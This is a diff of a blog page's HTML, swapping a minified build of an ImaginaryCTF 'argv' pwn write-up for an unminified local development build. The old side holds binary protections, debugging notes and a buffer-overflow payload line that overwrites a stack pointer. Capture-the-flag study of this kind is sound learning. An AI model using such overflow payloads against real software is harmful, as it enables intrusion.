@@ -1,255 +1,2008 @@
-<!doctype html><html itemscope lang=en-us itemtype=http://schema.org/WebPage><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1,maximum-scale=5"><meta name=theme-name content="hugoplate"><link rel="shortcut icon" href=/images/favicon_hu_4384881fdc2d307e.png type=image/x-icon><link rel=icon href=/images/favicon_hu_4384881fdc2d307e.png type=image/x-icon><link rel=icon type=image/png sizes=48x48 href=/images/favicon_hu_79c3559174e61a5e.png><link rel=icon type=image/png sizes=96x96 href=/images/favicon_hu_4384881fdc2d307e.png><link rel=apple-touch-icon sizes=144x144 href=/images/favicon_hu_cfffba76e19e8ff2.png><link rel=manifest href=/manifest.webmanifest><meta name=msapplication-TileColor content="#ddd"><meta name=theme-color content="#ffffff"><title>ImaginaryCTF Argv Pwn Writeup</title>
-<meta name=keywords content="Boilerplate,Hugo"><meta name=description content="Hugo & Tailwindcss Starter"><meta name=author content="zeon.studio"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://imgcdn.stablediffusionweb.com/2025/2/7/43af290a-fdbf-45eb-9144-731fe2ed39ad.jpg"><meta property="og:image" content="https://imgcdn.stablediffusionweb.com/2025/2/7/43af290a-fdbf-45eb-9144-731fe2ed39ad.jpg"><meta property="og:title" content="ImaginaryCTF Argv Pwn Writeup"><meta property="og:description" content="Hugo & Tailwindcss Starter"><meta property="og:type" content="website"><meta property="og:url" content="/blog/imaginaryctf/argv/"><meta name=twitter:title content="ImaginaryCTF Argv Pwn Writeup"><meta name=twitter:description content="Hugo & Tailwindcss Starter"><meta name=twitter:site content="@zeon_studio"><meta name=twitter:creator content="@zeon.studio"><script>let indexURL="/searchindex.json",includeSectionsInSearch=["blog"],search_no_results="No results for",search_initial_message="Type something to search.."</script><meta http-equiv=x-dns-prefetch-control content="on"><link rel=preconnect href=https://use.fontawesome.com crossorigin><link rel=preconnect href=//cdnjs.cloudflare.com><link rel=preconnect href=//www.googletagmanager.com><link rel=preconnect href=//www.google-analytics.com><link rel=dns-prefetch href=https://use.fontawesome.com><link rel=dns-prefetch href=//ajax.googleapis.com><link rel=dns-prefetch href=//cdnjs.cloudflare.com><link rel=dns-prefetch href=//www.googletagmanager.com><link rel=dns-prefetch href=//www.google-analytics.com><link rel=dns-prefetch href=//fonts.googleapis.com><link rel=dns-prefetch href=//connect.facebook.net><link rel=dns-prefetch href=//platform.linkedin.com><link rel=dns-prefetch href=//platform.twitter.com><link rel=preconnect href=https://fonts.googleapis.com><link rel=preconnect href=https://fonts.gstatic.com crossorigin><script>(function(){const e=document.createElement("link");e.href="https://fonts.googleapis.com/css2?family=Heebo:wght@400;600&family=Signika:wght@500;700&display=swap",e.type="text/css",e.rel="stylesheet",document.head.appendChild(e)})()</script><link href=/css/style.min.02fa0f0f9d366b1d956a8429f8fb07311907653a93fbb332ed54674227231659.css integrity="sha256-AvoPD502ax2VaoQp+PsHMRkHZTqT+7My7VRnQicjFlk=" rel=stylesheet><link rel=stylesheet href=/css/style-lazy.min.9e7e035d2f064fe004383f2ffc11a8f2966ef7b51c5fb2fac926e35c0061b5cf.css integrity="sha256-nn4DXS8GT+AEOD8v/BGo8pZu97UcX7L6ySbjXABhtc8=" media=print onload='this.media="all",this.onload=null'></head><body><header class="header sticky top-0 z-30"><nav class="navbar container"><div class=order-0><a class="navbar-brand block" href=/>zerofrost</a></div><input id=nav-toggle type=checkbox class=hidden>
-<label for=nav-toggle class="order-3 cursor-pointer flex items-center lg:hidden text-text-dark dark:text-white lg:order-1"><svg id="show-button" class="h-6 fill-current block" viewBox="0 0 20 20"><title>Menu Open</title><path d="M0 3h20v2H0V3zm0 6h20v2H0V9zm0 6h20v2H0V0z"/></svg><svg id="hide-button" class="h-6 fill-current hidden" viewBox="0 0 20 20"><title>Menu Close</title><polygon points="11 9 22 9 22 11 11 11 11 22 9 22 9 11 -2 11 -2 9 9 9 9 -2 11 -2" transform="rotate(45 10 10)"/></svg></label><ul id=nav-menu class="navbar-nav order-3 hidden lg:flex w-full pb-6 lg:order-1 lg:w-auto lg:space-x-2 lg:pb-0 xl:space-x-8"><li class=nav-item><a class=nav-link href=/>Home</a></li><li class=nav-item><a class=nav-link href=/blog>Blog</a></li><li class=nav-item><a class=nav-link href=/tags>Tags</a></li><li class=nav-item><a class=nav-link href=/categories>Categories</a></li><li class=nav-item><a class=nav-link href=/about>About</a></li><li class="mt-4 inline-block lg:hidden"><a class="btn btn-outline-primary btn-sm" href=/contact>Reach out</a></li></ul><div class="order-1 ml-auto flex items-center md:order-2 lg:ml-0"><button aria-label=search class="border-border text-text-dark hover:text-primary
-dark:border-darkmode-border mr-5 inline-block border-r pr-5
-text-xl dark:text-white cursor-pointer dark:hover:text-darkmode-primary" data-target=search-modal>
-<i class="fa-solid fa-search"></i></button><div class="theme-switcher mr-5 invisible"><input id=theme-switcher data-theme-switcher type=checkbox>
-<label for=theme-switcher><span class=sr-only>theme switcher</span>
-<span><svg class="absolute left-1/2 top-1/2 -translate-x-1/2 -translate-y-1/2 z-10 opacity-100 dark:opacity-0" viewBox="0 0 56 56" fill="#fff" height="16" width="16"><path d="M30 4.6c0-1-.9-2-2-2a2 2 0 00-2 2v5c0 1 .9 2 2 2s2-1 2-2zm9.6 9a2 2 0 000 2.8c.8.8 2 .8 2.9.0L46 13a2 2 0 000-2.9 2 2 0 00-3 0zm-26 2.8c.7.8 2 .8 2.8.0.8-.7.8-2 0-2.9L13 10c-.7-.7-2-.8-2.9.0-.7.8-.7 2.1.0 3zM28 16A12 12 0 0016 28a12 12 0 0012 12 12 12 0 0012-12A12 12 0 0028 16zm23.3 14c1.1.0 2-.9 2-2s-.9-2-2-2h-4.9a2 2 0 00-2 2c0 1.1 1 2 2 2zM4.7 26a2 2 0 00-2 2c0 1.1.9 2 2 2h4.9c1 0 2-.9 2-2s-1-2-2-2zm37.8 13.6a2 2 0 00-3 0 2 2 0 000 2.9l3.6 3.5a2 2 0 002.9.0c.8-.8.8-2.1.0-3zM10 43.1a2 2 0 000 2.9c.8.7 2.1.8 3 0l3.4-3.5c.8-.8.8-2.1.0-2.9s-2-.8-2.9.0zm20 3.4c0-1.1-.9-2-2-2a2 2 0 00-2 2v4.9c0 1 .9 2 2 2s2-1 2-2z"/></svg><svg class="absolute left-1/2 top-1/2 -translate-x-1/2 -translate-y-1/2 z-10 opacity-0 dark:opacity-100" viewBox="0 0 24 24" fill="none" height="16" width="16"><path fill="#000" fill-rule="evenodd" clip-rule="evenodd" d="M8.2 2.2c1-.4 2 .6 1.6 1.5-1 3-.4 6.4 1.8 8.7a8.4 8.4.0 008.7 1.8c1-.3 2 .5 1.5 1.5v.1A10.3 10.3.0 0112.4 22 10.3 10.3.0 013.2 6.7c1-2 2.9-3.5 4.9-4.4z"/></svg></span></label></div><script>var darkMode=localStorage.getItem("theme")==="dark";localStorage.getItem("theme")===null&&(darkMode=!1,window.matchMedia("(prefers-color-scheme: dark)").matches&&(darkMode=!0)),darkMode?document.documentElement.classList.add("dark"):document.documentElement.classList.remove("dark"),document.addEventListener("DOMContentLoaded",()=>{var e=document.querySelectorAll("[data-theme-switcher]"),t=document.querySelector(".theme-switcher");[].forEach.call(e,function(e){e.checked=darkMode,e.addEventListener("click",()=>{document.documentElement.classList.toggle("dark"),localStorage.setItem("theme",document.documentElement.classList.contains("dark")?"dark":"light")})}),t.classList.remove("invisible")})</script><a href=/contact class="btn btn-outline-primary btn-sm hidden lg:inline-block">Reach out</a></div></nav></header><div class=search-modal aria-hidden=true style=--color-primary:#1976d2><div data-target=close-search-modal class=search-modal-overlay></div><div class=search-wrapper data-image=true data-description=true data-tags=true data-categories=true><div class=search-wrapper-header><label for=search-modal-input style=margin-top:-1px><span class=sr-only>search icon</span>
-<svg viewBox="0 0 512 512" height="18" width="18" class="search-icon" data-type="search"><path fill="currentcolor" d="M416 208c0 45.9-14.9 88.3-40 122.7L502.6 457.4c12.5 12.5 12.5 32.8.0 45.3s-32.8 12.5-45.3.0L330.7 376c-34.4 25.2-76.8 40-122.7 40C93.1 416 0 322.9.0 208S93.1.0 208 0 416 93.1 416 208zM208 352a144 144 0 100-288 144 144 0 100 288z"/></svg>
-<svg viewBox="0 0 512 512" height="18" width="18" class="search-reset" data-type="reset"><path fill="currentcolor" d="M256 512A256 256 0 10256 0a256 256 0 100 512zM175 175c9.4-9.4 24.6-9.4 33.9.0l47 47 47-47c9.4-9.4 24.6-9.4 33.9.0s9.4 24.6.0 33.9l-47 47 47 47c9.4 9.4 9.4 24.6.0 33.9s-24.6 9.4-33.9.0l-47-47-47 47c-9.4 9.4-24.6 9.4-33.9.0s-9.4-24.6.0-33.9l47-47-47-47c-9.4-9.4-9.4-24.6.0-33.9z"/></svg>
-</label><input id=search-modal-input type=text data-search-input autocomplete=off aria-label=Search placeholder="Search Post..."></div><div class=search-wrapper-body><div class=search-result data-search-result></div><span class=search-result-empty>Type something to search..</span></div><div class=search-wrapper-footer><span><kbd><svg width="14" height="14" fill="currentcolor" viewBox="0 0 16 16"><path d="M3.204 11h9.592L8 5.519 3.204 11zm-.753-.659 4.796-5.48a1 1 0 011.506.0l4.796 5.48c.566.647.106 1.659-.753 1.659H3.204a1 1 0 01-.753-1.659z"/></svg>
-</kbd><kbd><svg width="14" height="14" fill="currentcolor" style="margin-top:1px" viewBox="0 0 16 16"><path d="M3.204 5h9.592L8 10.481 3.204 5zm-.753.659 4.796 5.48a1 1 0 001.506.0l4.796-5.48c.566-.647.106-1.659-.753-1.659H3.204a1 1 0 00-.753 1.659z"/></svg>
-</kbd>to navigate
-</span><span><kbd><svg width="12" height="12" fill="currentcolor" style="display:inline-block" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M14.5 1.5a.5.5.0 01.5.5v4.8a2.5 2.5.0 01-2.5 2.5H2.707l3.347 3.346a.5.5.0 01-.708.708l-4.2-4.2a.5.5.0 010-.708l4-4a.5.5.0 11.708.708L2.707 8.3H12.5A1.5 1.5.0 0014 6.8V2a.5.5.0 01.5-.5z"/></svg>
-</kbd>to select
-</span><span class=search-result-info></span>
-<span data-target=close-search-modal><kbd>ESC</kbd> to close</span></div></div></div><main><section class="section pt-7"><div class=container><div class="row justify-center"><article class=lg:col-10><div class=mb-10><img loading decoding=async src=https://imgcdn.stablediffusionweb.com/2025/2/7/43af290a-fdbf-45eb-9144-731fe2ed39ad.jpg alt="ImaginaryCTF Argv Pwn Writeup" class="w-full rounded img" height width></div><h1 class="h2 mb-4">ImaginaryCTF Argv Pwn Writeup</h1><ul class=mb-4><li class="mr-4 inline-block"><a href=/authors/zerofrost/><i class="fa-regular fa-circle-user mr-2"></i>zerofrost</a></li><li class="mr-4 inline-block"><i class="fa-regular fa-folder mr-2"></i>
-<a href=/categories/pwn/>Pwn</a></li><li class="mr-4 inline-block"><i class="fa-regular fa-clock mr-2"></i>
-February 11, 2024</li></ul><div class="content mb-10"><details open class="table-of-content blog"><summary>Table of Contents</summary><nav id=TableOfContents><ol><li><a href=#introduction>Introduction</a><ol><li><a href=#binary-information>Binary Information</a></li><li><a href=#ghidra>Ghidra</a></li><li><a href=#debugging>Debugging</a></li><li><a href=#leaking-addresses>Leaking Addresses</a></li><li><a href=#buffer-overflow-to-format-string>Buffer Overflow to Format String</a></li><li><a href=#method-1-arbitrary-write-to-libc-got>Method 1: Arbitrary Write to LIBC Got</a></li><li><a href=#method-2-house-of-husk>Method 2: House of Husk</a></li><li><a href=#references>References</a></li></ol></li></ol></nav></details><h2 id=introduction>Introduction</h2><p>This blog post is a walkthrough of an interesting pwn challenge I came across in the imaginary ctf discord challenge.</p><h3 id=binary-information>Binary Information</h3><p>Checking the file type of the binary, we can confirm that the file is a <code>64bit</code> executable which is dynamically linked and the libc file is provided. We can also see that the binary has <code>No Canary</code> and <code>No PIE</code>.</p><div class=highlight><pre tabindex=0 style=color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span>.<span style=color:#56b6c2>/</span><span style=color:#e06c75>argv</span>: <span style=color:#e06c75>ELF</span> <span style=color:#d19a66>64</span><span style=color:#56b6c2>-</span><span style=color:#e06c75>bit</span> <span style=color:#e06c75>LSB</span> <span style=color:#e06c75>executable</span>, <span style=color:#e06c75>x86</span><span style=color:#56b6c2>-</span><span style=color:#d19a66>64</span>, <span style=color:#e06c75>version</span> <span style=color:#d19a66>1</span> (<span style=color:#e06c75>SYSV</span>), <span style=color:#e06c75>dynamically</span> <span style=color:#e06c75>linked</span>, <span style=color:#e06c75>interpreter</span> <span style=color:#56b6c2>/</span><span style=color:#e06c75>lib64</span><span style=color:#56b6c2>/</span><span style=color:#e06c75>ld</span><span style=color:#56b6c2>-</span><span style=color:#e06c75>linux</span><span style=color:#56b6c2>-</span><span style=color:#e06c75>x86</span><span style=color:#56b6c2>-</span><span style=color:#d19a66>64.</span><span style=color:#e06c75>so</span><span style=color:#d19a66>.2</span>, <span style=color:#e06c75>BuildID</span>[<span style=color:#e06c75>sha1</span>]<span style=color:#56b6c2>=</span><span style=color:#d19a66>1</span><span style=color:#e06c75>ec247dc11817e2e52f5e75b63701f24d11a936c</span>, <span style=color:#c678dd>for</span> <span style=color:#e06c75>GNU</span><span style=color:#56b6c2>/</span><span style=color:#e06c75>Linux</span> <span style=color:#d19a66>3.2.0</span>, <span style=color:#e06c75>not</span> <span style=color:#e06c75>stripped</span>
-</span></span></code></pre></div><p>From the checksec results:</p><ul><li><code>Full RELRO</code> is enabled, meaning we can&rsquo;t overwrite got entries since most sections are marked as readable and not writable.</li><li><code>NX enabled</code>, also known as DEP is another exploit mitigation that enforces whether pages of memory can be treated as executable code.</li><li><code>PIE</code> stands for position independent executable, this binary is not position independent, which means at runtime we&rsquo;ll know its addresses. This is just so that we have static locations which we can interact with e.g. with arbitrary writes.</li></ul><div class=highlight><pre tabindex=0 style=color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span>[<span style=color:#56b6c2>*</span>] <span style=color:#56b6c2>-</span>  <span style=color:#e06c75>Checking</span> <span style=color:#e06c75>binary</span> <span style=color:#e06c75>protections</span>
-</span></span><span style=display:flex><span>[<span style=color:#56b6c2>*</span>] &#39;<span style=color:#56b6c2>/</span><span style=color:#e06c75>imaginaryctf</span><span style=color:#56b6c2>/</span><span style=color:#e06c75>argv</span><span style=color:#56b6c2>/</span><span style=color:#e06c75>argv</span>&#39;
-</span></span><span style=display:flex><span>    <span style=color:#e06c75>Arch</span>:     <span style=color:#e06c75>amd64</span><span style=color:#56b6c2>-</span><span style=color:#d19a66>64</span><span style=color:#56b6c2>-</span><span style=color:#e06c75>little</span>
-</span></span><span style=display:flex><span>    <span style=color:#e06c75>RELRO</span>:    <span style=color:#e06c75>Full</span> <span style=color:#e06c75>RELRO</span>
-</span></span><span style=display:flex><span>    <span style=color:#e06c75>Stack</span>:    <span style=color:#e06c75>No</span> <span style=color:#e06c75>canary</span> <span style=color:#e06c75>found</span>
-</span></span><span style=display:flex><span>    <span style=color:#e06c75>NX</span>:       <span style=color:#e06c75>NX</span> <span style=color:#e06c75>enabled</span>
-</span></span><span style=display:flex><span>    <span style=color:#e06c75>PIE</span>:      <span style=color:#e06c75>No</span> <span style=color:#61afef;font-weight:700>PIE</span> (<span style=color:#d19a66>0x400000</span>)
-</span></span></code></pre></div><ul><li>Checking for custom functions in the binary, we can see that the binary only has the <code>main</code> and has two interesting libc functions <code>gets</code> and <code>printf</code></li></ul><h3 id=ghidra>Ghidra</h3><ul><li>Opening the binary in Ghidra, we find the following code
-<img src=/images/ImaginaryCTF_-_Argv/Pasted_20241114212637.png alt></li></ul><p>From the code above, we can see that the binary runs <code>gets</code> and <code>printf</code> infinitely due to the <code>while</code> loop and therefore <code>does not exit or return</code>. This means that there is no return address to overwrite on the stack. The program enters a while loop where it accepts user input without bounds checking via the <code>gets</code> function, then prints <code>argv[0]</code> which represents the binary filename. We can confirm this by running the binary
-<img src=/images/ImaginaryCTF_-_Argv/run_binary.png alt></p><h3 id=debugging>Debugging</h3><p>To debug the program, I set two break points before the <code>gets</code> and <code>printf</code> functions. This will help us know the location of where our input is written on the stack, and the location of the <code>argv[0]</code> parameter also place on the stack, and if we can use our input to overwrite it.
-<img src=/images/ImaginaryCTF_-_Argv/Pasted_20241110203028.png alt>
-<img src=/images/ImaginaryCTF_-_Argv/Pasted_20241110203242.png alt></p><p>Checking the addresses passed to <code>printf</code>, we can see that the address <code>0x00007fffffffde8e</code> is passed as the first parameter.</p><blockquote><p>However, we can see that another address <code>0x00007fffffffdab8</code> contains a pointer pointing to the location of <code>argv[0]</code>. This address is located on the stack too(<code>0x00007fffffffd940</code>).</p></blockquote><p><img src=/images/ImaginaryCTF_-_Argv/Pasted_20241110204119.png alt></p><p>Taking a look of addresses on the stack starting from where the buffer starts, we can see the address to the filename at <code>0x7fffffffdab8</code>, What happens when we overwrite this address with a pointer to any string e.g. the start of our buffer? Let&rsquo;s try it out
-<img src=/images/ImaginaryCTF_-_Argv/Pasted_20241110204624.png alt></p><p>We can create a payload in python as follows</p><div class=highlight><pre tabindex=0 style=color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#e06c75>payload</span><span style=color:#56b6c2>=</span><span style=color:#98c379>&#39;A&#39;</span> <span style=color:#56b6c2>*</span> <span style=color:#d19a66>360</span> <span style=color:#56b6c2>+</span> <span style=color:#e06c75>p64</span>(<span style=color:#d19a66>0x7fffffffd950</span>) 
+<!doctype html>
+<html
+  itemscope
+  class=""
+  lang="en-us"
+  itemtype="http://schema.org/WebPage">
+  <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+    
+    <meta charset="utf-8" />
+
+
+<meta
+  name="viewport"
+  content="width=device-width, initial-scale=1, maximum-scale=5" />
+
+
+<meta name="theme-name" content="hugoplate" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<link rel="shortcut icon" href="/images/favicon_hu_4384881fdc2d307e.png" type="image/x-icon">
+<link rel="icon" href="/images/favicon_hu_4384881fdc2d307e.png" type="image/x-icon">
+<link rel="icon" type="image/png" sizes="48x48" href="/images/favicon_hu_79c3559174e61a5e.png">
+<link rel="icon" type="image/png" sizes="96x96" href="/images/favicon_hu_4384881fdc2d307e.png">
+<link rel="apple-touch-icon" sizes="144x144" href="/images/favicon_hu_cfffba76e19e8ff2.png">
+
+
+
+
+
+
+
+
+<link rel="manifest" href="/manifest.webmanifest" />
+<meta
+  name="msapplication-TileColor"
+  content="#ddd" />
+<meta
+  name="theme-color"
+  content="#ffffff" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  <base href="//localhost:1313/blog/imaginaryctf/argv/" />
+
+
+
+
+
+
+
+  
+
+
+<title>ImaginaryCTF Argv Pwn Writeup</title>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  <meta
+    name="keywords"
+    content="Boilerplate, Hugo" />
+
+
+
+
+<meta
+  name="description"
+  content="Hugo &amp; Tailwindcss Starter" />
+
+
+
+  <meta name="author" content="zeon.studio" />
+
+
+
+
+
+
+  
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+  <meta name="twitter:card" content="summary_large_image" />
+  <meta name="twitter:image" content="https://imgcdn.stablediffusionweb.com/2025/2/7/43af290a-fdbf-45eb-9144-731fe2ed39ad.jpg" />
+  <meta property="og:image" content="https://imgcdn.stablediffusionweb.com/2025/2/7/43af290a-fdbf-45eb-9144-731fe2ed39ad.jpg" />
+
+
+
+
+
+<meta property="og:title" content="ImaginaryCTF Argv Pwn Writeup" />
+<meta property="og:description" content="Hugo &amp; Tailwindcss Starter" />
+<meta property="og:type" content="website" />
+<meta property="og:url" content="//localhost:1313/blog/imaginaryctf/argv/" />
+
+
+<meta name="twitter:title" content="ImaginaryCTF Argv Pwn Writeup" />
+<meta name="twitter:description" content="Hugo &amp; Tailwindcss Starter" />
+
+
+  <meta name="twitter:site" content="@zeon_studio" />
+
+
+  <meta name="twitter:creator" content="@zeon.studio" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<script>
+  let indexURL = "//localhost:1313/searchindex.json";
+  let includeSectionsInSearch = ["blog"];
+  let search_no_results = "No results for";
+  let search_initial_message = "Type something to search..";
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+    
+    
+<meta http-equiv="x-dns-prefetch-control" content="on" />
+<link rel="preconnect" href="https://use.fontawesome.com" crossorigin />
+<link rel="preconnect" href="//cdnjs.cloudflare.com" />
+<link rel="preconnect" href="//www.googletagmanager.com" />
+<link rel="preconnect" href="//www.google-analytics.com" />
+<link rel="dns-prefetch" href="https://use.fontawesome.com" />
+<link rel="dns-prefetch" href="//ajax.googleapis.com" />
+<link rel="dns-prefetch" href="//cdnjs.cloudflare.com" />
+<link rel="dns-prefetch" href="//www.googletagmanager.com" />
+<link rel="dns-prefetch" href="//www.google-analytics.com" />
+<link rel="dns-prefetch" href="//fonts.googleapis.com" />
+<link rel="dns-prefetch" href="//connect.facebook.net" />
+<link rel="dns-prefetch" href="//platform.linkedin.com" />
+<link rel="dns-prefetch" href="//platform.twitter.com" />
+
+
+
+
+<link rel="preconnect" href="https://fonts.googleapis.com" />
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+<script>
+  (function () {
+    const googleFont = document.createElement("link");
+    googleFont.href = "https://fonts.googleapis.com/css2?family=Heebo:wght@400;600&family=Signika:wght@500;700&display=swap";
+    googleFont.type = "text/css";
+    googleFont.rel = "stylesheet";
+    document.head.appendChild(googleFont);
+  })();
+</script>
+
+
+
+
+
+
+  
+    
+      
+    
+  
+
+  
+    
+      
+    
+  
+
+  
+    
+      
+    
+  
+
+  
+    
+      
+    
+  
+
+  
+    
+      
+    
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<link
+  href="/css/style.css"
+  integrity=""
+  rel="stylesheet" />
+
+
+<link
+  rel="stylesheet"
+  href="/css/style-lazy.css"
+  integrity=""
+  media="print"
+  onload="this.media='all'; this.onload=null;" />
+
+
+  </head>
+
+  <body>
+    
+    
+      
+
+
+
+
+
+      
+      <div
+  class="fixed left-0 top-0 z-50 flex w-[30px] items-center justify-center bg-gray-200 py-[2.5px] text-[12px] uppercase text-black sm:bg-red-200 md:bg-yellow-200 lg:bg-green-200 xl:bg-blue-200 2xl:bg-pink-200">
+  <span class="block sm:hidden">all</span>
+  <span class="hidden sm:block md:hidden">sm</span>
+  <span class="hidden md:block lg:hidden">md</span>
+  <span class="hidden lg:block xl:hidden">lg</span>
+  <span class="hidden xl:block 2xl:hidden">xl</span>
+  <span class="hidden 2xl:block">2xl</span>
+</div>
+
+    
+
+
+    
+    
+
+
+
+
+
+    
+    <header
+  class="header sticky top-0 z-30">
+  <nav class="navbar container">
+    
+    <div class="order-0">
+      
+      <a class="navbar-brand block" href="/">
+        
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  zerofrost
+
+
+      </a>
+    </div>
+    
+    <input id="nav-toggle" type="checkbox" class="hidden" />
+    <label
+      for="nav-toggle"
+      class="order-3 cursor-pointer flex items-center lg:hidden text-text-dark dark:text-white lg:order-1">
+      <svg id="show-button" class="h-6 fill-current block" viewBox="0 0 20 20">
+        <title>Menu Open</title>
+        <path d="M0 3h20v2H0V3z m0 6h20v2H0V9z m0 6h20v2H0V0z"></path>
+      </svg>
+      <svg id="hide-button" class="h-6 fill-current hidden" viewBox="0 0 20 20">
+        <title>Menu Close</title>
+        <polygon
+          points="11 9 22 9 22 11 11 11 11 22 9 22 9 11 -2 11 -2 9 9 9 9 -2 11 -2"
+          transform="rotate(45 10 10)"></polygon>
+      </svg>
+    </label>
+    
+
+    
+    <ul
+      id="nav-menu"
+      class="navbar-nav order-3 hidden lg:flex w-full pb-6 lg:order-1 lg:w-auto lg:space-x-2 lg:pb-0 xl:space-x-8">
+      
+      
+        
+        
+        
+        
+          <li class="nav-item">
+            <a
+              class="nav-link "
+              
+              href="/"
+              >Home</a
+            >
+          </li>
+        
+      
+        
+        
+        
+        
+          <li class="nav-item">
+            <a
+              class="nav-link "
+              
+              href="/blog"
+              >Blog</a
+            >
+          </li>
+        
+      
+        
+        
+        
+        
+          <li class="nav-item">
+            <a
+              class="nav-link "
+              
+              href="/tags"
+              >Tags</a
+            >
+          </li>
+        
+      
+        
+        
+        
+        
+          <li class="nav-item">
+            <a
+              class="nav-link "
+              
+              href="/categories"
+              >Categories</a
+            >
+          </li>
+        
+      
+        
+        
+        
+        
+          <li class="nav-item">
+            <a
+              class="nav-link "
+              
+              href="/about"
+              >About</a
+            >
+          </li>
+        
+      
+      
+        <li class="mt-4 inline-block lg:hidden">
+          <a
+            class="btn btn-outline-primary btn-sm"
+            href="/contact">
+            Reach out
+          </a>
+        </li>
+      
+    </ul>
+
+    <div class="order-1 ml-auto flex items-center md:order-2 lg:ml-0">
+      
+        
+          <button
+            aria-label="search"
+            class="border-border text-text-dark hover:text-primary
+            dark:border-darkmode-border mr-5 inline-block border-r pr-5
+            text-xl dark:text-white cursor-pointer dark:hover:text-darkmode-primary
+            "
+            data-target="search-modal">
+            <i class="fa-solid fa-search"></i>
+          </button>
+        
+      
+
+      
+
+      
+
+
+  <div class="theme-switcher mr-5 invisible">
+    <input id="theme-switcher" data-theme-switcher type="checkbox" />
+    <label for="theme-switcher">
+      <span class="sr-only">theme switcher</span>
+      <span>
+        
+        <svg
+          class="absolute left-1/2 top-1/2 -translate-x-1/2 -translate-y-1/2 z-10 opacity-100 dark:opacity-0"
+          viewBox="0 0 56 56"
+          fill="#fff"
+          height="16"
+          width="16">
+          <path
+            d="M30 4.6c0-1-.9-2-2-2a2 2 0 0 0-2 2v5c0 1 .9 2 2 2s2-1 2-2Zm9.6 9a2 2 0 0 0 0 2.8c.8.8 2 .8 2.9 0L46 13a2 2 0 0 0 0-2.9 2 2 0 0 0-3 0Zm-26 2.8c.7.8 2 .8 2.8 0 .8-.7.8-2 0-2.9L13 10c-.7-.7-2-.8-2.9 0-.7.8-.7 2.1 0 3ZM28 16a12 12 0 0 0-12 12 12 12 0 0 0 12 12 12 12 0 0 0 12-12 12 12 0 0 0-12-12Zm23.3 14c1.1 0 2-.9 2-2s-.9-2-2-2h-4.9a2 2 0 0 0-2 2c0 1.1 1 2 2 2ZM4.7 26a2 2 0 0 0-2 2c0 1.1.9 2 2 2h4.9c1 0 2-.9 2-2s-1-2-2-2Zm37.8 13.6a2 2 0 0 0-3 0 2 2 0 0 0 0 2.9l3.6 3.5a2 2 0 0 0 2.9 0c.8-.8.8-2.1 0-3ZM10 43.1a2 2 0 0 0 0 2.9c.8.7 2.1.8 3 0l3.4-3.5c.8-.8.8-2.1 0-2.9-.8-.8-2-.8-2.9 0Zm20 3.4c0-1.1-.9-2-2-2a2 2 0 0 0-2 2v4.9c0 1 .9 2 2 2s2-1 2-2Z" />
+        </svg>
+        
+        <svg
+          class="absolute left-1/2 top-1/2 -translate-x-1/2 -translate-y-1/2 z-10 opacity-0 dark:opacity-100"
+          viewBox="0 0 24 24"
+          fill="none"
+          height="16"
+          width="16">
+          <path
+            fill="#000"
+            fill-rule="evenodd"
+            clip-rule="evenodd"
+            d="M8.2 2.2c1-.4 2 .6 1.6 1.5-1 3-.4 6.4 1.8 8.7a8.4 8.4 0 0 0 8.7 1.8c1-.3 2 .5 1.5 1.5v.1a10.3 10.3 0 0 1-9.4 6.2A10.3 10.3 0 0 1 3.2 6.7c1-2 2.9-3.5 4.9-4.4Z" />
+        </svg>
+      </span>
+    </label>
+  </div>
+
+  
+  <script>
+    var darkMode = localStorage.getItem("theme") === "dark";
+
+    if (localStorage.getItem("theme") === null) {
+      darkMode = false;
+
+      
+      if (window.matchMedia("(prefers-color-scheme: dark)").matches) {
+        darkMode = true;
+      }
+      
+    }
+
+    if (darkMode) {
+      document.documentElement.classList.add("dark");
+    } else {
+      document.documentElement.classList.remove("dark");
+    }
+
+    
+    document.addEventListener("DOMContentLoaded", () => {
+      var themeSwitch = document.querySelectorAll("[data-theme-switcher]");
+      var themeSwitcherContainer = document.querySelector('.theme-switcher');
+
+      [].forEach.call(themeSwitch, function (ts) {
+        ts.checked = darkMode;
+        ts.addEventListener("click", () => {
+          document.documentElement.classList.toggle("dark");
+          localStorage.setItem(
+            "theme",
+            document.documentElement.classList.contains("dark") ? "dark" : "light"
+          );
+        });
+      });
+
+      
+      themeSwitcherContainer.classList.remove("invisible");
+    });
+  </script>
+
+
+
+
+      
+      
+        <a
+          href="/contact"
+          class="btn btn-outline-primary btn-sm hidden lg:inline-block">
+          Reach out
+        </a>
+      
+    </div>
+  </nav>
+</header>
+
+    
+
+
+
+
+  
+    <div
+      class="search-modal "
+      aria-hidden="true"
+      style="--color-primary: #1976d2">
+      <div data-target="close-search-modal" class="search-modal-overlay"></div>
+      <div
+        class="search-wrapper"
+        data-image="true"
+        data-description="true"
+        data-tags="true"
+        data-categories="true">
+        <div class="search-wrapper-header">
+          <label for="search-modal-input" style="margin-top:-1px">
+            <span class="sr-only">search icon</span>
+            <svg
+              xmlns="http://www.w3.org/2000/svg"
+              viewBox="0 0 512 512"
+              height="18"
+              width="18"
+              class="search-icon"
+              data-type="search">
+              <path
+                fill="currentColor"
